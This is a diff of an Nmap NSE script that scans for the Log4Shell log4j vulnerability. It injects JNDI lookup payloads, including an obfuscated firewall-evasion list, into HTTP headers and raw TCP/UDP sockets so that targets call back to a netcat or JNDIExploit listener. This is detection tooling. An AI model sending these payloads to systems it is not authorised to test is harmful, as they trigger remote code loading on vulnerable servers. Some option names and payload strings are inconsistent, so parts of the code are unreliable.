@@ -7,41 +7,49 @@ crafted request to a server running a vulnerable version of log4j. The crafted
 request uses a Java Naming and Directory Interface (JNDI) injection via a variety
 of services including:
 
-    -  Lightweight Directory Access Protocol (LDAP)
-    -  Secure LDAP (LDAPS)
-    -  Remote Method Invocation (RMI)
-    -  Domain Name Service (DNS)
+-  Lightweight Directory Access Protocol (LDAP)
+-  Secure LDAP (LDAPS)
+-  Remote Method Invocation (RMI)
+-  Domain Name Service (DNS)
 
 If the vulnerable server uses log4j to log requests, the exploit will then request
 a malicious payload over JNDI through one of the services above from an
 attacker-controlled server. Successful exploitation could lead to RCE.
 
-Usage
 
-Method A:
-    - Download JNDIExploit from GitHub (https://github.com/giterlizzi/JNDIExploit/releases/download/v1.2/JNDIExploit.zip)
+Callback Server
 
-    - Start JNDIExploit server:
-        java -jar JNDIExploit.jar
+The script relies on callbacks from the target being scanned and hence any
+firewall rules or interaction with other security devices will affect the
+efficacy of the script.
 
-    - Run Nmap with --script log4shell.nse script
-        nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>
 
-    - See JNDIExploit output for see the received LDAP query (log4shell/{target host}/{target port})
-        [+] Received LDAP Query: log4shell/127.0.0.1/8080
-        [!] Invalid LDAP Query: log4shell/127.0.0.1/8080
+Netcat or Ncat:
 
-Method B:
-    - Listen a TCP port with netcat (or ncat):
-        ncat -vkl 1389   # Ncat
-        nc -lvnp 1389    # Netcat
+- Listen a TCP port with netcat (or ncat):
+    ncat -vkl 1389   # Ncat
+    nc -lvnp 1389    # Netcat
 
-    - Run Nmap with --script log4shell.nse script
-        nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>
+- Run Nmap with --script log4shell.nse script
+    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>
 
-    - See the target IP address in netcat (or ncat) output:
-        Ncat: Connection from 172.17.0.2.
-        Ncat: Connection from 172.17.0.2:38898.
+- See the target IP address in netcat (or ncat) output:
+    Ncat: Connection from 172.17.0.2.
+    Ncat: Connection from 172.17.0.2:38898.
+
+JNDIExploit:
+
+- Download JNDIExploit from GitHub (https://github.com/giterlizzi/JNDIExploit/releases/download/v1.2/JNDIExploit.zip)
+
+- Start JNDIExploit server:
+    java -jar JNDIExploit.jar
+
+- Run Nmap with --script log4shell.nse script
+    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>
+
+- See JNDIExploit output for see the received LDAP query (log4shell/{target host}/{target port})
+    [+] Received LDAP Query: log4shell/127.0.0.1/8080
+    [!] Invalid LDAP Query: log4shell/127.0.0.1/8080
 ]]
 
 author     = 'Giuseppe Di Terlizzi <giuseppe DIT diterlizzi AT nttdata DOT com>'
@@ -56,6 +64,7 @@ categories = {"vuln", "safe", "external"}
 -- @args http-method      HTTP method (default: GET)
 -- @args url-path         URL path (default: /)
 -- @args waf-bypass       WAF bypass
+-- @args test-method      Test through 'http' (default), 'tcp', 'udp' or 'all'
 --
 -- @output
 -- PORT   STATE SERVICE
@@ -72,17 +81,27 @@ categories = {"vuln", "safe", "external"}
 --
 -- @xmloutput
 -- <script id="log4shell" output="[...]">
+--   <elem key="Callback">127.0.0.1:389</elem>
+--   <elem key="Test Method">HTTP</elem>
 --   <table key="Payloads">
 --   <elem>${jndi:ldap://127.0.0.1:389}</elem>
 --   </table>
---   <elem key="Path">/</elem>
---   <elem key="Method">GET</elem>
---   <table key="Headers">
+--   <elem key="URL Path">/</elem>
+--   <elem key="HTTP Method">GET</elem>
+--   <table key="HTTP Headers">
 --     <elem key="X-Api-Version">200 </elem>
 --     <elem key="Referer">200 </elem>
 --     <elem key="User-Agent">200 </elem>
 --   </table>
 --   <elem key="Note">(!) Inspect the callback server (172.17.42.1:389) or web-application (172.17.42.2:8080) logs</elem>
+-- </script>
+-- <script id="log4shell" output="[...]">
+--   <elem key="Callback">127.0.0.1:389</elem>
+--   <elem key="Test Method">Socket (tcp)</elem>
+--   <table key="Payloads">
+--   <elem>${jndi:ldap://127.0.0.1:389}</elem>
+--   </table>
+--   <elem key="Note">(!) Inspect the callback server (172.17.42.1:389) or application (172.17.42.2:8080) logs</elem>
 -- </script>
 --
 -- @changelog
@@ -106,88 +125,148 @@ local nmap      = require "nmap"
 local stdnse    = require "stdnse"
 local shortport = require "shortport"
 local stringaux = require "stringaux"
+local tableaux  = require "tableaux"
 
-portrule = shortport.http
+local HTTP_METHODS = { 'GET', 'HEAD', 'POST', 'OPTIONS' }
+local HTTP_HEADERS = {'X-Api-Version', 'User-Agent', 'Cookie', 'Referer', 'Accept-Language', 'Accept-Encoding', 'Upgrade-Insecure-Requests', 'Accept', 'upgrade-insecure-requests', 'Origin', 'Pragma', 'X-Requested-With', 'X-CSRF-Token', 'Dnt', 'Content-Length', 'Access-Control-Request-Method', 'Access-Control-Request-Headers', 'Warning', 'Authorization', 'TE', 'Accept-Charset', 'Accept-Datetime', 'Date', 'Expect', 'Forwarded', 'From', 'Max-Forwards', 'Proxy-Authorization', 'Range,', 'Content-Disposition', 'Content-Encoding', 'X-Amz-Target', 'X-Amz-Date', 'Content-Type', 'Username', 'IP', 'IPaddress', 'Hostname'}
+
+-- Default payload
+local DEFAULT_PAYLOAD = '${jndi:ldap://%s}'
+
+-- WAF (Web Application Firewall) bypass payloads
+local WAF_BYPASS_PAYLOADS = {
+  -- RMI
+  '${jndi:rmi://%s}',
+  '${${lower:jndi}:${lower:rmi}://%s}',
+  '${jndi:${lower:r}${lower:m}${lower:i}',
+  '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s}',
+
+  -- DNS
+  '${jndi:dns://%s}',
+  '${${lower:jndi}:${lower:dns}://%s}',
+  '${jndi:${lower:d}${lower:n}${lower:s}',
+  '${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://%s}',
+
+  -- LDAP
+  '${jndi:ldap://%s}',
+  '${${lower:jndi}:${lower:ldap}://%s}',
+  '${jndi:${lower:l}${lower:d}a${lower:p}',
+  '${jndi:${lower:l}${lower:d}${lower:d}${lower:p}',
+  '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}a${::-p}://%s}',
+  '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s}',
+}
+
+
+portrule = function(host, port)
+  return true
+end
+
 
 action = function(host, port)
 
+  local callback_server  = stdnse.get_script_args(SCRIPT_NAME .. '.callback-server') or '127.0.0.1:1389'
+  local waf_bypass       = stdnse.get_script_args(SCRIPT_NAME .. '.waf-bypass') or nil
+  local http_headers_arg = stdnse.get_script_args(SCRIPT_NAME .. '.http-headers') or nil
+  local http_method      = stdnse.get_script_args(SCRIPT_NAME .. '.http-method') or 'GET'
+  local url_path         = stdnse.get_script_args(SCRIPT_NAME .. '.url-path') or '/'
+  local test_method      = stdnse.get_script_args(SCRIPT_NAME .. '.test-method') or 'http'
+
+  local payloads = { DEFAULT_PAYLOAD }
   local output = stdnse.output_table()
 
-  local callback_server = stdnse.get_script_args(SCRIPT_NAME .. '.callback-server') or stdnse.get_script_args('log4shell.exploit-server') or '127.0.0.1:1389'
-  local http_headers    = stdnse.get_script_args(SCRIPT_NAME .. '.http-headers') or nil
-  local http_method     = stdnse.get_script_args(SCRIPT_NAME .. '.http-method') or 'GET'
-  local url_path        = stdnse.get_script_args(SCRIPT_NAME .. '.url-path') or '/'
-  local waf_bypass      = stdnse.get_script_args(SCRIPT_NAME .. '.waf-bypass') or nil
-
-  -- Default payload
-  local payload = '${jndi:ldap://%s}'
-
-  -- WAF (Web Application Firewall) bypass payloads
-  local waf_payloads = {
-    '${jndi:rmi://%s}',
-    '${${lower:jndi}:${lower:rmi}://%s}',
-    '${jndi:${lower:r}${lower:m}${lower:i}',
-    '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s}',
-
-    '${jndi:dns://%s}',
-    '${${lower:jndi}:${lower:dns}://%s}',
-    '${jndi:${lower:d}${lower:n}${lower:s}',
-    '${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://%s}',
-
-    '${jndi:ldap://%s}',
-    '${${lower:jndi}:${lower:ldap}://%s}',
-    '${jndi:${lower:l}${lower:d}a${lower:p}',
-    '${jndi:${lower:l}${lower:d}${lower:d}${lower:p}',
-    '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}a${::-p}://%s}',
-    '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s}',
-  }
-
-  local payloads = { payload }
-
-  local headers = {'X-Api-Version', 'User-Agent', 'Cookie', 'Referer', 'Accept-Language', 'Accept-Encoding', 'Upgrade-Insecure-Requests', 'Accept', 'upgrade-insecure-requests', 'Origin', 'Pragma', 'X-Requested-With', 'X-CSRF-Token', 'Dnt', 'Content-Length', 'Access-Control-Request-Method', 'Access-Control-Request-Headers', 'Warning', 'Authorization', 'TE', 'Accept-Charset', 'Accept-Datetime', 'Date', 'Expect', 'Forwarded', 'From', 'Max-Forwards', 'Proxy-Authorization', 'Range,', 'Content-Disposition', 'Content-Encoding', 'X-Amz-Target', 'X-Amz-Date', 'Content-Type', 'Username', 'IP', 'IPaddress', 'Hostname'}
-
-  if http_headers ~= nil then
-    headers = stringaux.strsplit(',', http_headers)
-  end
-
-  output.Path     = url_path
-  output.Method   = http_method
-  output.Payloads = {}
-  output.Headers  = {}
-
   if waf_bypass ~= nil then
-    payloads = waf_payloads
+    payloads = WAF_BYPASS_PAYLOADS
   end
 
-  for i, payload in ipairs(payloads) do
+  output.Callback = callback_server
+  output.Payloads = {}
 
-    local exploit_payload = string.format(payload, callback_server)
-    output.Payloads[#output.Payloads + 1] = exploit_payload
+  -- Check via HTTP
+  if test_method == 'http' or test_method == 'all' then
 
-    for x, payload_header in ipairs(headers) do
+    output['Test Method'] = 'HTTP'
 
-      stdnse.debug1(string.format('%s --> %s', payload_header, exploit_payload))
+    if shortport.http(host, port) then
 
-      local header = {
-        [payload_header] = exploit_payload
-      }
-
-      local response = http.generic_request(host, port.number, http_method:upper(), url_path, { header = header, no_cache = true })
-      local status   = response.status
-
-      if status == nil then
-        -- Something went really wrong out there
-        -- According to the NSE way we will die silently rather than spam user with error messages
-      else
-        local status_string = http.get_status_string(response)
-        output.Headers[payload_header] = status_string
+      if not tableaux.contains(HTTP_METHODS, http_method:upper()) then
+        stdnse.verbose1("Skipping '%s' %s, unknown HTTP method", SCRIPT_NAME, SCRIPT_TYPE)
+        return nil
       end
+      
+      local http_headers = HTTP_HEADERS
+    
+      output.Callback = callback_server
+      output.Payloads = {}
+
+      output['URL Path']     = url_path
+      output['HTTP Method']  = http_method
+      output['HTTP Headers'] = {}
+    
+      if http_headers_arg ~= nil then
+        http_headers = stringaux.strsplit(',', http_headers_arg)
+      end
+    
+      for i, payload in ipairs(payloads) do
+    
+        local exploit_payload = string.format(payload, callback_server)
+        output.Payloads[#output.Payloads + 1] = exploit_payload
+    
+        for x, payload_header in ipairs(http_headers) do
+    
+          stdnse.debug1(string.format('%s --> %s', payload_header, exploit_payload))
+    
+          local header = {
+            [payload_header] = exploit_payload
+          }
+    
+          local response = http.generic_request(host, port.number, http_method:upper(), url_path, { header = header, no_cache = true })
+          local status   = response.status
+    
+          if status == nil then
+            -- Something went really wrong out there
+            -- According to the NSE way we will die silently rather than spam user with error messages
+          else
+            local status_string = http.get_status_string(response)
+            output['HTTP Headers'][payload_header] = status_string
+          end
+    
+        end
+      end
+    
+      output.Note = string.format('(!) Inspect the callback server (%s) or web-application (%s:%s) logs', callback_server, host.ip, port.number)
+    
+      return output
+
+    end
+
+  end
+
+  -- Check TCP/UDP services
+  if test_method == 'socket' or test_method == 'all' then
+
+    output['Test Method'] = string.format('Socket (%s)', port.protocol)
+
+    if not shortport.http(host, port) then
+
+      for i, payload in ipairs(payloads) do
+    
+        local exploit_payload = string.format(payload, callback_server)
+        output.Payloads[#output.Payloads + 1] = exploit_payload
+    
+        local socket = nmap.new_socket(port.protocol)
+        socket:set_timeout(host.times.timeout * 1000)
+    
+        socket:connect( host, port )
+        local status, err = socket:send( exploit_payload )
+        socket:close()
+    
+      end
+    
+      output.Note = string.format('(!) Inspect the callback server (%s) or application (%s:%s) logs', callback_server, host.ip, port.number)
+    
+      return output
 
     end
   end
-
-  output.Note = string.format('(!) Inspect the callback server (%s) or web-application (%s:%s) logs', callback_server, host.ip, port.number)
-
-  return output
 
 end
